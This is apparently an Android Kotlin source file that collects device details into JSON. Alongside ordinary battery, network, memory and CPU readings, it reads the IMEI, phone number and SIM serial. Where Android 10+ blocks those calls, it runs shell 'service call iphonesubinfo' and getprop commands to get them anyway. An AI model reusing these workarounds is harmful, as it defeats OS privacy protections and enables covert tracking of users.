package com.kztutorial99.androidconnector

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.telephony.TelephonyManager
import com.google.gson.JsonObject
import java.io.RandomAccessFile
import java.net.Inet4Address
import java.net.NetworkInterface

object DeviceInfo {

    @SuppressLint("MissingPermission", "HardwareIds")
    fun collect(context: Context): JsonObject {
        val json = JsonObject()

        // ── Baterai ────────────────────────────────────────────────────────────
        val battIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = battIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = battIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: 100
        val battPct = if (level >= 0 && scale > 0) (level * 100 / scale).toString() else "--"
        val status = battIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        json.addProperty("battery", battPct)
        json.addProperty("batteryStatus", if (isCharging) "Charging" else "Discharging")

        // ── Info Perangkat ─────────────────────────────────────────────────────
        json.addProperty("model", "${Build.MANUFACTURER} ${Build.MODEL}")
        json.addProperty("androidVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        json.addProperty("hostname", Build.HOST ?: "--")
        json.addProperty("kernel", System.getProperty("os.version") ?: "--")
        json.addProperty("screenState", "Active")
        json.addProperty("brand", Build.BRAND ?: "--")
        json.addProperty("device", Build.DEVICE ?: "--")
        json.addProperty("product", Build.PRODUCT ?: "--")
        json.addProperty("fingerprint", Build.FINGERPRINT?.take(60) ?: "--")

        // ── Jaringan ───────────────────────────────────────────────────────────
        json.addProperty("ip", getIPAddress())
        json.addProperty("networkType", getNetworkType(context))

        // ── SIM & Telepon ──────────────────────────────────────────────────────
        collectSimInfo(context, json)

        // ── Storage ────────────────────────────────────────────────────────────
        try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            val totalGb = stat.totalBytes / (1024f * 1024f * 1024f)
            val freeGb = stat.availableBytes / (1024f * 1024f * 1024f)
            json.addProperty("storage", "%.1f".format(totalGb - freeGb))
            json.addProperty("storageFree", "%.1f GB".format(freeGb))
        } catch (_: Exception) {
            json.addProperty("storage", "--")
            json.addProperty("storageFree", "--")
        }

        // ── RAM ────────────────────────────────────────────────────────────────
        try {
            var totalKb = 0L; var freeKb = 0L
            RandomAccessFile("/proc/meminfo", "r").use { reader ->
                repeat(5) {
                    val line = reader.readLine() ?: return@repeat
                    when {
                        line.startsWith("MemTotal:")     -> totalKb = line.split("\\s+".toRegex())[1].toLong()
                        line.startsWith("MemAvailable:") -> freeKb  = line.split("\\s+".toRegex())[1].toLong()
                    }
                }
            }
            json.addProperty("memTotal", "%.0f MB".format(totalKb / 1024f))
            json.addProperty("memFree",  "%.0f MB".format(freeKb / 1024f))
        } catch (_: Exception) {
            json.addProperty("memTotal", "--")
            json.addProperty("memFree", "--")
        }

        // ── CPU ────────────────────────────────────────────────────────────────
        json.addProperty("cpuUsage", getCpuUsage())

        // ── Uptime ─────────────────────────────────────────────────────────────
        val upMs = SystemClock.elapsedRealtime()
        json.addProperty("uptime", "${upMs / 3_600_000}h ${(upMs % 3_600_000) / 60_000}m")

        return json
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun collectSimInfo(context: Context, json: JsonObject) {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            // ── IMEI ──────────────────────────────────────────────────────────
            // Android 10+ blokir getImei() → fallback ke shell IPC
            val imei = getImei(tm)
            json.addProperty("imei", imei)

            // ── Nomor HP ──────────────────────────────────────────────────────
            // line1Number sering kosong → coba SubscriptionManager
            val phone = getPhoneNumber(context, tm)
            json.addProperty("phoneNumber", phone)

            // ── Operator SIM & Jaringan ───────────────────────────────────────
            val simOpName = tm.simOperatorName?.takeIf { it.isNotBlank() } ?: "--"
            json.addProperty("simOperator", simOpName)
            json.addProperty("simCountry", tm.simCountryIso?.uppercase()?.takeIf { it.isNotBlank() } ?: "--")
            // networkOperatorName sering kosong di HP Indonesia → fallback ke simOperatorName
            val netOpName = tm.networkOperatorName?.takeIf { it.isNotBlank() }
                ?: simOpName.takeIf { it != "--" }
                ?: "--"
            json.addProperty("networkOperator", netOpName)

            // ── Serial SIM ───────────────────────────────────────────────────
            // Android 10+ blokir simSerialNumber → coba shell IPC
            val simSerial = getSimSerial(tm)
            json.addProperty("simSerial", simSerial)

            // ── Slot SIM ─────────────────────────────────────────────────────
            val simSlots = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try { "${tm.phoneCount} slot" } catch (_: Exception) { "--" }
            } else "--"
            json.addProperty("simSlots", simSlots)

            // Status SIM
            val simState = when (tm.simState) {
                TelephonyManager.SIM_STATE_ABSENT       -> "Tidak ada SIM"
                TelephonyManager.SIM_STATE_PIN_REQUIRED -> "Butuh PIN"
                TelephonyManager.SIM_STATE_PUK_REQUIRED -> "Butuh PUK"
                TelephonyManager.SIM_STATE_READY        -> "Siap"
                TelephonyManager.SIM_STATE_NOT_READY    -> "Belum siap"
                TelephonyManager.SIM_STATE_UNKNOWN      -> "Tidak diketahui"
                else                                     -> "Lainnya"
            }
            json.addProperty("simState", simState)

            // Generasi jaringan (2G/3G/4G/5G)
            val netGen = try {
                @Suppress("DEPRECATION")
                when (tm.networkType) {
                    TelephonyManager.NETWORK_TYPE_GPRS,
                    TelephonyManager.NETWORK_TYPE_EDGE,
                    TelephonyManager.NETWORK_TYPE_CDMA,
                    TelephonyManager.NETWORK_TYPE_1xRTT  -> "2G"
                    TelephonyManager.NETWORK_TYPE_UMTS,
                    TelephonyManager.NETWORK_TYPE_HSDPA,
                    TelephonyManager.NETWORK_TYPE_HSUPA,
                    TelephonyManager.NETWORK_TYPE_HSPA,
                    TelephonyManager.NETWORK_TYPE_HSPAP,
                    TelephonyManager.NETWORK_TYPE_EVDO_0,
                    TelephonyManager.NETWORK_TYPE_EVDO_A,
                    TelephonyManager.NETWORK_TYPE_EVDO_B -> "3G"
                    TelephonyManager.NETWORK_TYPE_LTE    -> "4G LTE"
                    TelephonyManager.NETWORK_TYPE_NR     -> "5G"
                    else                                  -> "--"
                }
            } catch (_: Exception) { "--" }
            json.addProperty("networkGeneration", netGen)

            // Roaming
            json.addProperty("roaming", if (tm.isNetworkRoaming) "Ya" else "Tidak")

            // MCC + MNC (kode jaringan)
            val mccMnc = tm.networkOperator?.takeIf { it.length >= 5 }
                ?.let { "${it.take(3)}-${it.drop(3)}" } ?: "--"
            json.addProperty("mccMnc", mccMnc)

        } catch (_: Exception) {
            for (field in listOf("imei","phoneNumber","simOperator","simCountry","networkOperator",
                "simSerial","simSlots","simState","networkGeneration","roaming","mccMnc")) {
                json.addProperty(field, "--")
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  IMEI via API → fallback ke shell IPC (Android 10+)
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getImei(tm: TelephonyManager): String {
        // Coba API resmi dulu
        try {
            val imei = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                tm.getImei(0) ?: tm.getImei(1) ?: tm.meid
            } else {
                @Suppress("DEPRECATION") tm.deviceId
            }
            if (!imei.isNullOrBlank() && imei != "0") return imei
        } catch (_: Exception) {}

        // Fallback: shell IPC — bekerja di banyak HP tanpa root
        return try {
            val raw = shell("service call iphonesubinfo 1 s16 com.android.shell")
            parseIpcString(raw).takeIf { it.length in 14..17 } ?: imeiFromShell()
        } catch (_: Exception) { "--" }
    }

    private fun imeiFromShell(): String {
        return try {
            // Beberapa vendor expose IMEI via getprop
            val r = shell("getprop ro.ril.oem.imei").trim()
            if (r.length in 14..17 && r.all { it.isDigit() }) return r
            val r2 = shell("getprop ril.imei").trim()
            if (r2.length in 14..17 && r2.all { it.isDigit() }) return r2
            "--"
        } catch (_: Exception) { "--" }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Nomor HP via line1Number → SubscriptionManager → shell IPC
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getPhoneNumber(ctx: Context, tm: TelephonyManager): String {
        // Cara 1: line1Number
        try {
            val n = tm.line1Number?.trim()?.takeIf { it.isNotBlank() && it != "0" }
            if (n != null) return n
        } catch (_: Exception) {}

        // Cara 2: SubscriptionManager (API 22+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                    as android.telephony.SubscriptionManager
                @Suppress("DEPRECATION")
                val subs = sm.activeSubscriptionInfoList
                if (!subs.isNullOrEmpty()) {
                    for (sub in subs) {
                        val n = sub.number?.trim()?.takeIf { it.isNotBlank() && it != "0" }
                        if (n != null) return n
                    }
                }
            } catch (_: Exception) {}
        }

        // Cara 3: shell IPC
        return try {
            val raw = shell("service call iphonesubinfo 7 s16 com.android.shell")
            parseIpcString(raw).takeIf { it.isNotBlank() && it != "0" } ?: "--"
        } catch (_: Exception) { "--" }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Serial SIM via API → fallback ke shell IPC
    // ─────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun getSimSerial(tm: TelephonyManager): String {
        try {
            val s = tm.simSerialNumber?.trim()?.takeIf { it.isNotBlank() }
            if (s != null) return s
        } catch (_: Exception) {}

        return try {
            val raw = shell("service call iphonesubinfo 11 s16 com.android.shell")
            parseIpcString(raw).takeIf { it.isNotBlank() } ?: "--"
        } catch (_: Exception) { "--" }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Parse output "service call iphonesubinfo" → string UTF-16
    //  Format baris: 0x00000010: 00320035 00320030 ... '5.2.0.2.'
    //  Baca karakter di antara kutip tunggal, filter titik (null char)
    // ─────────────────────────────────────────────────────────────────────────

    private fun parseIpcString(raw: String): String {
        val sb = StringBuilder()
        for (line in raw.lines()) {
            val start = line.lastIndexOf('\'')
            val end   = line.indexOf('\'')
            if (start == end || start < 0) continue            // tidak ada kutip
            val chars = line.substring(end + 1, start)         // isi antara kutip pertama dan terakhir
            for (c in chars) {
                if (c != '.' && c != ' ') sb.append(c)        // titik = null byte, abaikan
            }
        }
        return sb.toString().trim()
    }

    private fun shell(cmd: String): String = try {
        val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out
    } catch (_: Exception) { "" }

    private fun getIPAddress(): String {
        return try {
            NetworkInterface.getNetworkInterfaces()?.toList()
                ?.flatMap { it.inetAddresses.toList() }
                ?.firstOrNull { !it.isLoopbackAddress && it is Inet4Address }
                ?.hostAddress ?: "--"
        } catch (_: Exception) { "--" }
    }

    private fun getNetworkType(ctx: Context): String {
        return try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork ?: return "None") ?: return "Unknown"
            when {
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                else -> "Unknown"
            }
        } catch (_: Exception) { "--" }
    }

    private fun getCpuUsage(): String {
        return try {
            fun readCpu(): Pair<Long, Long> {
                RandomAccessFile("/proc/stat", "r").use { r ->
                    val parts = r.readLine().trim().split("\\s+".toRegex())
                    val values = parts.drop(1).take(8).map { it.toLong() }
                    return Pair(values[3] + values[4], values.sum())
                }
            }
            val (idle1, total1) = readCpu()
            Thread.sleep(400)
            val (idle2, total2) = readCpu()
            val dTotal = total2 - total1
            val dIdle = idle2 - idle1
            if (dTotal == 0L) return "--"
            "${((dTotal - dIdle) * 100 / dTotal).toInt()}%"
        } catch (_: Exception) { "--" }
    }
}
